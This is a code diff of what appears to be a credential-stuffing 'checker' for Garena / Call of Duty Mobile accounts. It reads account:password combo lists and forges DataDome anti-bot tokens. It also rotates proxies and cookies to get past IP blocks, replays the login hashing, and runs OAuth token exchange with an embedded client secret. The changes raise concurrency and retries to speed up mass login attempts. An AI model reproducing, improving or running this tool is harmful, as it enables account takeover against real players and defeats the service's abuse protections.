@@ -249,32 +249,13 @@ def _scroll_print(line: str):
 
 CODM_REGIONS = {'AF':{'name':'Afghanistan','code':'93','flag':'🇦🇫'},'AL':{'name':'Albania','code':'355','flag':'🇦🇱'},'DZ':{'name':'Algeria','code':'213','flag':'🇩🇿'},'AD':{'name':'Andorra','code':'376','flag':'🇦🇩'},'AO':{'name':'Angola','code':'244','flag':'🇦🇴'},'AG':{'name':'Antigua and Barbuda','code':'1','flag':'🇦🇬'},'AR':{'name':'Argentina','code':'54','flag':'🇦🇷'},'AM':{'name':'Armenia','code':'374','flag':'🇦🇲'},'AU':{'name':'Australia','code':'61','flag':'🇦🇺'},'AT':{'name':'Austria','code':'43','flag':'🇦🇹'},'AZ':{'name':'Azerbaijan','code':'994','flag':'🇦🇿'},'BS':{'name':'Bahamas','code':'1','flag':'🇧🇸'},'BH':{'name':'Bahrain','code':'973','flag':'🇧🇭'},'BD':{'name':'Bangladesh','code':'880','flag':'🇧🇩'},'BB':{'name':'Barbados','code':'1','flag':'🇧🇧'},'BY':{'name':'Belarus','code':'375','flag':'🇧🇾'},'BE':{'name':'Belgium','code':'32','flag':'🇧🇪'},'BZ':{'name':'Belize','code':'501','flag':'🇧🇿'},'BJ':{'name':'Benin','code':'229','flag':'🇧🇯'},'BT':{'name':'Bhutan','code':'975','flag':'🇧🇹'},'BO':{'name':'Bolivia','code':'591','flag':'🇧🇴'},'BA':{'name':'Bosnia and Herzegovina','code':'387','flag':'🇧🇦'},'BW':{'name':'Botswana','code':'267','flag':'🇧🇼'},'BR':{'name':'Brazil','code':'55','flag':'🇧🇷'},'BN':{'name':'Brunei','code':'673','flag':'🇧🇳'},'BG':{'name':'Bulgaria','code':'359','flag':'🇧🇬'},'BF':{'name':'Burkina Faso','code':'226','flag':'🇧🇫'},'BI':{'name':'Burundi','code':'257','flag':'🇧🇮'},'KH':{'name':'Cambodia','code':'855','flag':'🇰🇭'},'CM':{'name':'Cameroon','code':'237','flag':'🇨🇲'},'CA':{'name':'Canada','code':'1','flag':'🇨🇦'},'CV':{'name':'Cape Verde','code':'238','flag':'🇨🇻'},'CF':{'name':'Central African Republic','code':'236','flag':'🇨🇫'},'TD':{'name':'Chad','code':'235','flag':'🇹🇩'},'CL':{'name':'Chile','code':'56','flag':'🇨🇱'},'CN':{'name':'China','code':'86','flag':'🇨🇳'},'CO':{'name':'Colombia','code':'57','flag':'🇨🇴'},'KM':{'name':'Comoros','code':'269','flag':'🇰🇲'},'CG':{'name':'Congo','code':'242','flag':'🇨🇬'},'CD':{'name':'Congo (DRC)','code':'243','flag':'🇨🇩'},'CR':{'name':'Costa Rica','code':'506','flag':'🇨🇷'},'CI':{'name':"Côte d'Ivoire",'code':'225','flag':'🇨🇮'},'HR':{'name':'Croatia','code':'385','flag':'🇭🇷'},'CU':{'name':'Cuba','code':'53','flag':'🇨🇺'},'CY':{'name':'Cyprus','code':'357','flag':'🇨🇾'},'CZ':{'name':'Czech Republic','code':'420','flag':'🇨🇿'},'DK':{'name':'Denmark','code':'45','flag':'🇩🇰'},'DJ':{'name':'Djibouti','code':'253','flag':'🇩🇯'},'DM':{'name':'Dominica','code':'1','flag':'🇩🇲'},'DO':{'name':'Dominican Republic','code':'1','flag':'🇩🇴'},'EC':{'name':'Ecuador','code':'593','flag':'🇪🇨'},'EG':{'name':'Egypt','code':'20','flag':'🇪🇬'},'SV':{'name':'El Salvador','code':'503','flag':'🇸🇻'},'GQ':{'name':'Equatorial Guinea','code':'240','flag':'🇬🇶'},'ER':{'name':'Eritrea','code':'291','flag':'🇪🇷'},'EE':{'name':'Estonia','code':'372','flag':'🇪🇪'},'SZ':{'name':'Eswatini','code':'268','flag':'🇸🇿'},'ET':{'name':'Ethiopia','code':'251','flag':'🇪🇹'},'FJ':{'name':'Fiji','code':'679','flag':'🇫🇯'},'FI':{'name':'Finland','code':'358','flag':'🇫🇮'},'FR':{'name':'France','code':'33','flag':'🇫🇷'},'GA':{'name':'Gabon','code':'241','flag':'🇬🇦'},'GM':{'name':'Gambia','code':'220','flag':'🇬🇲'},'GE':{'name':'Georgia','code':'995','flag':'🇬🇪'},'DE':{'name':'Germany','code':'49','flag':'🇩🇪'},'GH':{'name':'Ghana','code':'233','flag':'🇬🇭'},'GR':{'name':'Greece','code':'30','flag':'🇬🇷'},'GD':{'name':'Grenada','code':'1','flag':'🇬🇩'},'GT':{'name':'Guatemala','code':'502','flag':'🇬🇹'},'GN':{'name':'Guinea','code':'224','flag':'🇬🇳'},'GW':{'name':'Guinea-Bissau','code':'245','flag':'🇬🇼'},'GY':{'name':'Guyana','code':'592','flag':'🇬🇾'},'HT':{'name':'Haiti','code':'509','flag':'🇭🇹'},'HN':{'name':'Honduras','code':'504','flag':'🇭🇳'},'HK':{'name':'Hong Kong','code':'852','flag':'🇭🇰'},'HU':{'name':'Hungary','code':'36','flag':'🇭🇺'},'IS':{'name':'Iceland','code':'354','flag':'🇮🇸'},'IN':{'name':'India','code':'91','flag':'🇮🇳'},'ID':{'name':'Indonesia','code':'62','flag':'🇮🇩'},'IR':{'name':'Iran','code':'98','flag':'🇮🇷'},'IQ':{'name':'Iraq','code':'964','flag':'🇮🇶'},'IE':{'name':'Ireland','code':'353','flag':'🇮🇪'},'IL':{'name':'Israel','code':'972','flag':'🇮🇱'},'IT':{'name':'Italy','code':'39','flag':'🇮🇹'},'JM':{'name':'Jamaica','code':'1','flag':'🇯🇲'},'JP':{'name':'Japan','code':'81','flag':'🇯🇵'},'JO':{'name':'Jordan','code':'962','flag':'🇯🇴'},'KZ':{'name':'Kazakhstan','code':'7','flag':'🇰🇿'},'KE':{'name':'Kenya','code':'254','flag':'🇰🇪'},'KI':{'name':'Kiribati','code':'686','flag':'🇰🇮'},'KR':{'name':'South Korea','code':'82','flag':'🇰🇷'},'KW':{'name':'Kuwait','code':'965','flag':'🇰🇼'},'KG':{'name':'Kyrgyzstan','code':'996','flag':'🇰🇬'},'LA':{'name':'Laos','code':'856','flag':'🇱🇦'},'LV':{'name':'Latvia','code':'371','flag':'🇱🇻'},'LB':{'name':'Lebanon','code':'961','flag':'🇱🇧'},'LS':{'name':'Lesotho','code':'266','flag':'🇱🇸'},'LR':{'name':'Liberia','code':'231','flag':'🇱🇷'},'LY':{'name':'Libya','code':'218','flag':'🇱🇾'},'LI':{'name':'Liechtenstein','code':'423','flag':'🇱🇮'},'LT':{'name':'Lithuania','code':'370','flag':'🇱🇹'},'LU':{'name':'Luxembourg','code':'352','flag':'🇱🇺'},'MO':{'name':'Macau','code':'853','flag':'🇲🇴'},'MG':{'name':'Madagascar','code':'261','flag':'🇲🇬'},'MW':{'name':'Malawi','code':'265','flag':'🇲🇼'},'MY':{'name':'Malaysia','code':'60','flag':'🇲🇾'},'MV':{'name':'Maldives','code':'960','flag':'🇲🇻'},'ML':{'name':'Mali','code':'223','flag':'🇲🇱'},'MT':{'name':'Malta','code':'356','flag':'🇲🇹'},'MH':{'name':'Marshall Islands','code':'692','flag':'🇲🇭'},'MR':{'name':'Mauritania','code':'222','flag':'🇲🇷'},'MU':{'name':'Mauritius','code':'230','flag':'🇲🇺'},'MX':{'name':'Mexico','code':'52','flag':'🇲🇽'},'FM':{'name':'Micronesia','code':'691','flag':'🇫🇲'},'MD':{'name':'Moldova','code':'373','flag':'🇲🇩'},'MC':{'name':'Monaco','code':'377','flag':'🇲🇨'},'MN':{'name':'Mongolia','code':'976','flag':'🇲🇳'},'ME':{'name':'Montenegro','code':'382','flag':'🇲🇪'},'MA':{'name':'Morocco','code':'212','flag':'🇲🇦'},'MZ':{'name':'Mozambique','code':'258','flag':'🇲🇿'},'MM':{'name':'Myanmar','code':'95','flag':'🇲🇲'},'NA':{'name':'Namibia','code':'264','flag':'🇳🇦'},'NR':{'name':'Nauru','code':'674','flag':'🇳🇷'},'NP':{'name':'Nepal','code':'977','flag':'🇳🇵'},'NL':{'name':'Netherlands','code':'31','flag':'🇳🇱'},'NZ':{'name':'New Zealand','code':'64','flag':'🇳🇿'},'NI':{'name':'Nicaragua','code':'505','flag':'🇳🇮'},'NE':{'name':'Niger','code':'227','flag':'🇳🇪'},'NG':{'name':'Nigeria','code':'234','flag':'🇳🇬'},'MK':{'name':'North Macedonia','code':'389','flag':'🇲🇰'},'NO':{'name':'Norway','code':'47','flag':'🇳🇴'},'OM':{'name':'Oman','code':'968','flag':'🇴🇲'},'PK':{'name':'Pakistan','code':'92','flag':'🇵🇰'},'PW':{'name':'Palau','code':'680','flag':'🇵🇼'},'PA':{'name':'Panama','code':'507','flag':'🇵🇦'},'PG':{'name':'Papua New Guinea','code':'675','flag':'🇵🇬'},'PY':{'name':'Paraguay','code':'595','flag':'🇵🇾'},'PE':{'name':'Peru','code':'51','flag':'🇵🇪'},'PH':{'name':'Philippines','code':'63','flag':'🇵🇭'},'PL':{'name':'Poland','code':'48','flag':'🇵🇱'},'PT':{'name':'Portugal','code':'351','flag':'🇵🇹'},'QA':{'name':'Qatar','code':'974','flag':'🇶🇦'},'RO':{'name':'Romania','code':'40','flag':'🇷🇴'},'RU':{'name':'Russia','code':'7','flag':'🇷🇺'},'RW':{'name':'Rwanda','code':'250','flag':'🇷🇼'},'KN':{'name':'Saint Kitts and Nevis','code':'1','flag':'🇰🇳'},'LC':{'name':'Saint Lucia','code':'1','flag':'🇱🇨'},'VC':{'name':'Saint Vincent and the Grenadines','code':'1','flag':'🇻🇨'},'WS':{'name':'Samoa','code':'685','flag':'🇼🇸'},'SM':{'name':'San Marino','code':'378','flag':'🇸🇲'},'ST':{'name':'São Tomé and Príncipe','code':'239','flag':'🇸🇹'},'SA':{'name':'Saudi Arabia','code':'966','flag':'🇸🇦'},'SN':{'name':'Senegal','code':'221','flag':'🇸🇳'},'RS':{'name':'Serbia','code':'381','flag':'🇷🇸'},'SC':{'name':'Seychelles','code':'248','flag':'🇸🇨'},'SL':{'name':'Sierra Leone','code':'232','flag':'🇸🇱'},'SG':{'name':'Singapore','code':'65','flag':'🇸🇬'},'SK':{'name':'Slovakia','code':'421','flag':'🇸🇰'},'SI':{'name':'Slovenia','code':'386','flag':'🇸🇮'},'SB':{'name':'Solomon Islands','code':'677','flag':'🇸🇧'},'SO':{'name':'Somalia','code':'252','flag':'🇸🇴'},'ZA':{'name':'South Africa','code':'27','flag':'🇿🇦'},'SS':{'name':'South Sudan','code':'211','flag':'🇸🇸'},'ES':{'name':'Spain','code':'34','flag':'🇪🇸'},'LK':{'name':'Sri Lanka','code':'94','flag':'🇱🇰'},'SD':{'name':'Sudan','code':'249','flag':'🇸🇩'},'SR':{'name':'Suriname','code':'597','flag':'🇸🇷'},'SE':{'name':'Sweden','code':'46','flag':'🇸🇪'},'CH':{'name':'Switzerland','code':'41','flag':'🇨🇭'},'SY':{'name':'Syria','code':'963','flag':'🇸🇾'},'TW':{'name':'Taiwan','code':'886','flag':'🇹🇼'},'TJ':{'name':'Tajikistan','code':'992','flag':'🇹🇯'},'TZ':{'name':'Tanzania','code':'255','flag':'🇹🇿'},'TH':{'name':'Thailand','code':'66','flag':'🇹🇭'},'TL':{'name':'Timor-Leste','code':'670','flag':'🇹🇱'},'TG':{'name':'Togo','code':'228','flag':'🇹🇬'},'TO':{'name':'Tonga','code':'676','flag':'🇹🇴'},'TT':{'name':'Trinidad and Tobago','code':'1','flag':'🇹🇹'},'TN':{'name':'Tunisia','code':'216','flag':'🇹🇳'},'TR':{'name':'Turkey','code':'90','flag':'🇹🇷'},'TM':{'name':'Turkmenistan','code':'993','flag':'🇹🇲'},'TV':{'name':'Tuvalu','code':'688','flag':'🇹🇻'},'UG':{'name':'Uganda','code':'256','flag':'🇺🇬'},'UA':{'name':'Ukraine','code':'380','flag':'🇺🇦'},'AE':{'name':'United Arab Emirates','code':'971','flag':'🇦🇪'},'GB':{'name':'United Kingdom','code':'44','flag':'🇬🇧'},'US':{'name':'United States','code':'1','flag':'🇺🇸'},'UY':{'name':'Uruguay','code':'598','flag':'🇺🇾'},'UZ':{'name':'Uzbekistan','code':'998','flag':'🇺🇿'},'VU':{'name':'Vanuatu','code':'678','flag':'🇻🇺'},'VA':{'name':'Vatican City','code':'39','flag':'🇻🇦'},'VE':{'name':'Venezuela','code':'58','flag':'🇻🇪'},'VN':{'name':'Vietnam','code':'84','flag':'🇻🇳'},'YE':{'name':'Yemen','code':'967','flag':'🇾🇪'},'ZM':{'name':'Zambia','code':'260','flag':'🇿🇲'},'ZW':{'name':'Zimbabwe','code':'263','flag':'🇿🇼'}}
 
-def _make_session(pool_size=64):
-    """Build a requests.Session tuned for high-throughput checking.
-
-    Args:
-        pool_size: max simultaneous connections per host. 64 is a good
-            default; raise it for very large thread pools.
-    """
+def _make_session(pool_size=1000):
     s = requests.Session()
-    # Transport-level retries: 1 retry on connection errors, with 0.3s
-    # backoff. This is faster than the manual Python-level retry loop,
-    # because urllib3 handles it in C while the GIL is released.
-    from urllib3.util.retry import Retry
-    retry = Retry(
-        total=1,
-        connect=1,
-        read=0,
-        status=0,
-        backoff_factor=0.3,
-        status_forcelist=[],
-        allowed_methods=['GET', 'POST'],
-    )
     adapter = requests.adapters.HTTPAdapter(
         pool_connections=pool_size,
         pool_maxsize=pool_size,
-        max_retries=retry,
-        pool_block=True,            # wait for a free conn instead of failing
+        max_retries=0,
+        pool_block=False
     )
     s.mount('http://', adapter)
     s.mount('https://', adapter)
@@ -1553,6 +1534,8 @@ def _next_datadome_seed():
         i = _DATADOME_SEED_IDX['i']
         _DATADOME_SEED_IDX['i'] = (i + 1) % len(_DATADOME_SEEDS)
         return _DATADOME_SEEDS[i]
+
+
 _SESSION_MAX_AGE_SECONDS = 6 * 3600
 
 _SESSION_USES_PER_COOKIE = 10
@@ -1598,7 +1581,7 @@ def _capture_ac_session(session, session_key):
                                '(KHTML, like Gecko) Chrome/154.0.0.0 Mobile Safari/537.36'),
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             },
-            timeout=6, allow_redirects=True,
+            timeout=20, allow_redirects=True,
         )
         ac = r.cookies.get('ac_session') or session.cookies.get('ac_session')
         if ac:
@@ -1625,6 +1608,7 @@ def _get_any_session():
         _CURRENT_SESSION_USES = 1
         _SESSION_POOL_INDEX  += 1
         return _CURRENT_SESSION
+
 
 def _get_session_for(account):
     return _get_any_session()
@@ -1718,6 +1702,7 @@ class ProxyManager:
     def get_count(self):
         return len(self.proxies)
 
+
 def extract_datadome_token(cookie_str):
     if not cookie_str:
         return ''
@@ -1731,6 +1716,7 @@ def extract_datadome_token(cookie_str):
     if val.startswith('datadome='):
         return val.split('=', 1)[1].strip()
     return val
+
 
 class CookieManager:
 
@@ -1818,6 +1804,7 @@ class CookieManager:
         except Exception:
             pass
 
+
 def encode(plaintext, key):
     key = bytes.fromhex(key)
     plaintext = bytes.fromhex(plaintext)
@@ -1825,15 +1812,18 @@ def encode(plaintext, key):
     ciphertext = cipher.encrypt(plaintext)
     return ciphertext.hex()[:32]
 
+
 def get_passmd5(password):
     decoded_password = urllib.parse.unquote(password)
     return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()
+
 
 def hash_password(password, v1, v2):
     passmd5 = get_passmd5(password)
     inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
     outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
     return encode(passmd5, outer_hash)
+
 
 def applyck(session, cookie_str):
     session.cookies.clear()
@@ -1874,6 +1864,7 @@ def applyck(session, cookie_str):
         else:
             session.cookies.set(k, v, domain='.garena.com')
 
+
 _ip_wait_lock = threading.Lock()
 _ip_wait_active = False
 _ip_wait_event = threading.Event()
@@ -1883,6 +1874,7 @@ _ip_block_callback = None
 def _save_session_cookies(session):
     return False
 
+
 def init_ga_cookies(session):
     timestamp = int(time.time())
     random_id = random.randint(1000000000, 9999999999)
@@ -1890,6 +1882,7 @@ def init_ga_cookies(session):
     for name, value in ga_cookies.items():
         session.cookies.set(name, value, domain='.garena.com')
     return ga_cookies
+
 
 class DataDomeGenerator:
 
@@ -1949,7 +1942,7 @@ class DataDomeGenerator:
             return 46 + n
         return 50 * n + 45
 
-    def generate_payload(self, data: Dict[str, Any], timestamp: int) -> str:
+    def generate_payload(self, data: dict[str, any], timestamp: int) -> str:
         seed_from_cookie = self._hash_str_to_int(self.cookie)
         initial_seed = self.t ^ seed_from_cookie ^ self._hash_str_to_int(self.key)
         e = self._prng_h(self._prng_h((timestamp >> 3 ^ 11027890091) * self.t))
@@ -2001,6 +1994,7 @@ class DataDomeGenerator:
             return ''.join(result_chars[:-(3 - padding)])
         return ''.join(result_chars)
 
+
 class DataDomeManager:
     def __init__(self):
         self.current_datadome = None
@@ -2008,7 +2002,7 @@ class DataDomeManager:
         self._403_attempts = 0
         self._local_lock = threading.Lock()
         self._local_request_count = 0
-        self._local_max_requests = 800
+        self._local_max_requests = 250
 
     def set_datadome(self, datadome_cookie):
         if datadome_cookie and datadome_cookie != self.current_datadome:
@@ -2098,7 +2092,7 @@ class DataDomeManager:
                     _log('WARNING', 'IP BLOCKED — could not detect IP, waiting 10s')
                 if _ip_block_callback:
                     _ip_block_callback(True)
-                time.sleep(10)
+                time.sleep(1)
                 if _ip_block_callback:
                     _ip_block_callback(False)
                 return True
@@ -2173,6 +2167,7 @@ class DataDomeManager:
                 return False
         return False
 
+
 def get_datadome_cookie(session, proxies=None):
     url = 'https://datadome.garena.com/js/'
     headers = {
@@ -2205,7 +2200,7 @@ def get_datadome_cookie(session, proxies=None):
     }
     data = '&'.join((f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items()))
     try:
-        response = session.post(url, headers=headers, data=data, proxies=proxies, timeout=5)
+        response = session.post(url, headers=headers, data=data, proxies=proxies, timeout=8)
         response.raise_for_status()
         response_json = response.json()
         if response_json.get('status') == 200 and 'cookie' in response_json:
@@ -2219,6 +2214,7 @@ def get_datadome_cookie(session, proxies=None):
         pass
     return None
 
+
 _CAPTCHA_MARKERS = (b'<html', b'<!doctype', b'datadome', b'interstitial', b'captcha', b'robot', b'blocked')
 _FAKE_CHECK_BYTES = 200  # was 400 — 200 is enough to detect HTML/captcha markers
 
@@ -2226,11 +2222,12 @@ def _is_fake_response(response):
     ct = response.headers.get('content-type', '').lower()
     if 'text/html' in ct:
         return True
-    raw = response.content[:_FAKE_CHECK_BYTES].lower()
+    raw = response.content[:400].lower()
     for marker in _CAPTCHA_MARKERS:
         if marker in raw:
             return True
     return False
+
 
 def prelogin(session, account, datadome_manager, cookie_manager, retries=6, proxy_manager=None):
     all_403 = True
@@ -2262,7 +2259,7 @@ def prelogin(session, account, datadome_manager, cookie_manager, retries=6, prox
             }
             if cookie_header:
                 headers['cookie'] = cookie_header
-            _to = 8 if (proxy_manager and proxy_manager.is_loaded()) else 5
+            _to = 20 if (proxy_manager and proxy_manager.is_loaded()) else 8
             response = session.get(url, headers=headers, params=params, timeout=_to)
             if response.status_code == 403:
                 if proxy_manager and proxy_manager.is_loaded():
@@ -2281,7 +2278,7 @@ def prelogin(session, account, datadome_manager, cookie_manager, retries=6, prox
                 all_403 = True
                 break
             if response.status_code == 429:
-                time.sleep(0.2)
+                time.sleep(0.8)
                 continue
             response.raise_for_status()
             if _is_fake_response(response):
@@ -2383,6 +2380,7 @@ def prelogin(session, account, datadome_manager, cookie_manager, retries=6, prox
         return ('NETWORK_ERROR', None, None)
     return (None, None, None)
 
+
 def login(session, account, password, v1, v2):
     hashed_password = hash_password(password, v1, v2)
     url = 'https://sso.garena.com/api/login'
@@ -2403,7 +2401,7 @@ def login(session, account, password, v1, v2):
     retries = 3
     for attempt in range(retries):
         try:
-            _to = 8
+            _to = 20
             response = session.get(url, headers=headers, params=params, timeout=_to)
             response.raise_for_status()
             login_cookies = {}
@@ -2430,7 +2428,7 @@ def login(session, account, password, v1, v2):
                 data = response.json()
             except json.JSONDecodeError:
                 if attempt < retries - 1:
-                    time.sleep(0.1)
+                    time.sleep(0.5)
                     continue
                 return None
 
@@ -2447,7 +2445,7 @@ def login(session, account, password, v1, v2):
                 if error_msg in ('ACCOUNT DOESNT EXIST', 'error_no_account', 'error_auth', 'error_user_ban', 'error_security_ban'):
                     return f'permanent_fail:{error_msg}'
                 if attempt < retries - 1:
-                    time.sleep(0.2)
+                    time.sleep(0.8)
                     continue
                 return None
             return sso_key
@@ -2457,9 +2455,11 @@ def login(session, account, password, v1, v2):
                 continue
     return None
 
+
 def _generate_device_id():
     import uuid
     return f'02-{uuid.uuid4()}'
+
 
 def get_codm_grant_code(session):
     for attempt in range(OAUTH_MAX_RETRIES):
@@ -2480,7 +2480,7 @@ def get_codm_grant_code(session):
             if cookie_header:
                 grant_headers['Cookie'] = cookie_header
             grant_body = f'client_id=100082&response_type=code&redirect_uri=gop100082%3A%2F%2Fauth%2F&create_grant=true&login_scenario=normal&format=json&id={random_id}'
-            resp = session.post(grant_url, headers=grant_headers, data=grant_body, timeout=6)
+            resp = session.post(grant_url, headers=grant_headers, data=grant_body, timeout=12)
             resp.raise_for_status()
             data = resp.json()
             code = data.get('code', '')
@@ -2500,6 +2500,7 @@ def get_codm_grant_code(session):
             return ''
     return ''
 
+
 def token_exchange(code, device_id=None, proxies=None):
     if not device_id:
         device_id = _generate_device_id()
@@ -2517,7 +2518,7 @@ def token_exchange(code, device_id=None, proxies=None):
     exchange_body = f'grant_type=authorization_code&code={code}&device_id={urllib.parse.quote(device_id)}&redirect_uri={urllib.parse.quote(REDIRECT_URI)}&source=2&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}'
     for attempt in range(OAUTH_MAX_RETRIES):
         try:
-            resp = requests.post(exchange_url, headers=exchange_headers, data=exchange_body, timeout=6, proxies=proxies)
+            resp = requests.post(exchange_url, headers=exchange_headers, data=exchange_body, timeout=12, proxies=proxies)
             resp.raise_for_status()
             data = resp.json()
             access_token = data.get('access_token', '')
@@ -2537,6 +2538,7 @@ def token_exchange(code, device_id=None, proxies=None):
             return ''
     return ''
 
+
 def get_codm_access_token(session):
     try:
         random_id = str(int(time.time() * 1000))
@@ -2545,7 +2547,7 @@ def get_codm_access_token(session):
         import uuid
         device_id = f'02-{str(uuid.uuid4())}'
         grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'
-        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=6)
+        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
         grant_json = grant_response.json()
         auth_code = grant_json.get('code', '')
         if not auth_code:
@@ -2553,7 +2555,7 @@ def get_codm_access_token(session):
         token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
         token_headers = {'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': '100082.connect.garena.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
         token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
-        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=6)
+        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
         token_json = token_response.json()
         access_token = token_json.get('access_token', '')
         open_id = token_json.get('open_id', '')
@@ -2562,11 +2564,12 @@ def get_codm_access_token(session):
     except Exception:
         return ('', '', '')
 
+
 def process_codm_callback(session, access_token, open_id=None, uid=None):
     try:
         old_callback_url = f'https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}'
         old_headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36', 'referer': 'https://auth.garena.com/'}
-        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=6)
+        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=15)
         location = old_response.headers.get('Location', '')
         if 'err=3' in location:
             return (None, 'no_codm')
@@ -2575,7 +2578,7 @@ def process_codm_callback(session, access_token, open_id=None, uid=None):
             return (token, 'success')
         aos_callback_url = f'https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}'
         aos_headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36', 'referer': 'https://100082.connect.garena.com/', 'x-requested-with': 'com.garena.game.codm'}
-        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=6)
+        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=15)
         aos_location = aos_response.headers.get('Location', '')
         if 'err=3' in aos_location:
             return (None, 'no_codm')
@@ -2585,6 +2588,7 @@ def process_codm_callback(session, access_token, open_id=None, uid=None):
         return (None, 'unknown_error')
     except Exception:
         return (None, 'error')
+
 
 def get_codm_user_info(session, token):
     try:
@@ -2605,7 +2609,7 @@ def get_codm_user_info(session, token):
             pass
         url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/'
         headers = {'accept': 'application/json, text/plain, */*', 'codm-delete-token': token, 'origin': 'https://delete-request-aos.codm.garena.co.id', 'referer': 'https://delete-request-aos.codm.garena.co.id/', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36', 'x-requested-with': 'com.garena.game.codm'}
-        response = session.get(url, headers=headers, timeout=6)
+        response = session.get(url, headers=headers, timeout=15)
         data = response.json()
         user_data = data.get('user', {})
         if user_data:
@@ -2613,6 +2617,7 @@ def get_codm_user_info(session, token):
         return {}
     except Exception:
         return {}
+
 
 def check_codm_account(session, account):
     codm_info = {}
@@ -2632,6 +2637,7 @@ def check_codm_account(session, account):
     except Exception:
         pass
     return (has_codm, codm_info)
+
 
 def parse_account_details(data):
     user_info = data.get('user_info', {})
@@ -2673,6 +2679,7 @@ def parse_account_details(data):
         security_indicators.append('[WARNING] Suspicious')
     account_info['security_status'] = '[SUCCESS] Normal' if not security_indicators else ' | '.join(security_indicators)
     return account_info
+
 
 def display_codm_info(account, password, details, codm_info, has_codm,
                       error_reason=None, game_connections=None, is_elegant=False):
@@ -2826,6 +2833,7 @@ def _flush_auto_remove(file_manager, combo_file_path, force=False):
     except Exception:
         pass
 
+
 def _queue_auto_remove(account, password, file_manager, combo_file_path):
     with _auto_remove_lock:
         _auto_remove_queue.append(f'{account}:{password}')
@@ -2917,7 +2925,7 @@ def save_game_folder(account, password, account_data, game_connections, base_dir
 
 
 def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager, combo_file_path, auto_remove, use_elegant_display=False, suppress_print=False, proxy_manager=None):
-    max_retries = 4
+    max_retries = 15
     attempt = 0
     _tried_cached = False
     
@@ -2972,17 +2980,15 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                     if auto_remove:
                         _queue_auto_remove(account, password, file_manager, combo_file_path)
                     return 'ERROR'
-
             if v1 == 'NETWORK_ERROR':
                 if attempt < max_retries:
-                    backoff = min(2 ** attempt, 30) + random.uniform(0, 2)
+                    backoff = min(attempt * 0.5, 3) + random.uniform(0, 0.5)
                     if proxy_manager and proxy_manager.is_loaded():
                         try:
                             session.proxies.clear()
                             session.proxies.update(proxy_manager.get_next())
                         except Exception:
                             pass
-                    # [suppressed] network error backoff print
                     time.sleep(backoff)
                     continue
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Network Error'}
@@ -2992,6 +2998,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                 if auto_remove:
                     _queue_auto_remove(account, password, file_manager, combo_file_path)
                 return 'ERROR'
+
 
             if v1 == 'NO_ACCOUNT':
                 live_stats.update_stats(valid=False)
@@ -3074,7 +3081,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             if cookie_header:
                 headers['cookie'] = cookie_header
             
-            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=6)
+            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=12)
             
             if response.status_code == 403:
                 bad_cookie = session.cookies.get('datadome') or datadome_manager.get_datadome()
@@ -3087,7 +3094,8 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                 if datadome_manager.handle_403(session):
                     if attempt < max_retries:
                         backoff = min(2 ** attempt, 60) + random.uniform(0, 3)
-                        # [suppressed] 403 backoff print
+                        if not suppress_print:
+                            print(f'  {_YL}⚠  403 — backoff {backoff:.1f}s ({attempt}/{max_retries}){_RST}')
                         time.sleep(backoff)
                         continue
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Cookie Banned/IP Blocked'}
@@ -3101,8 +3109,9 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                 account_data_json = response.json()
             except json.JSONDecodeError:
                 if attempt < max_retries:
-                    # [suppressed] invalid response retry print
-                    time.sleep(0.2)
+                    if not suppress_print:
+                        print(f'  {_YL}⚠  Invalid response, retrying ({attempt}/{max_retries}){_RST}')
+                    time.sleep(0.8)
                     continue
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Server Response'}
                 live_stats.update_stats(is_error=True)
@@ -3145,44 +3154,32 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             else:
